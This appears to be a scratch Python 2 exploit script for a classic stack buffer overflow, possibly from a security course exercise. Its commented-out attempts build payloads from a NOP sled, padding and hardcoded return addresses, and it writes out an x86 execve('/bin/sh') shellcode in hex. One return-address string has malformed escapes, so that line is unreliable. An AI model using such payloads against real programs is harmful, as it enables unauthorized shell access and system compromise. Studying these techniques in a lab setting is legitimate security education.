from shellcode import shellcode

# nop  = "\x90"*40
# # garbage = "X"*47
# garbage = "X"*42
# #sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
# #buf_offset = "\xe0\xf1\xfe\xbf"  # bf fe f1 e0
# buf_offset =  "\xe0\xf1\xfe\xbf"  # 0x bf fe f1 e0
# print nop + shellcode + garbage + buf_offset
# # print nop + sc + garbage + buf_offset
#
# # print shellcode + garbage + buf_offset

# nop = "\x90"*82
# ret = "\xb0\xf1\xfe\xbf"  # 0x bf fe f1 cc

# nop  = "\x90"*40
# garbage = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
# ret = ("\x58\xf2\fe\bf\xcc\xf1\fe\bf")    # 0x bf fe f1 cc + 140 = 0x bf fe f2 58

# "A"*82 + "\xb0\xf7\xff\xbf" # 0x bf ff f7 b0

#print "A"*82 +  shellcode + "\x84\xf7\xff\xbf"
print shellcode

#0xbffef238

#0xbffef1cc
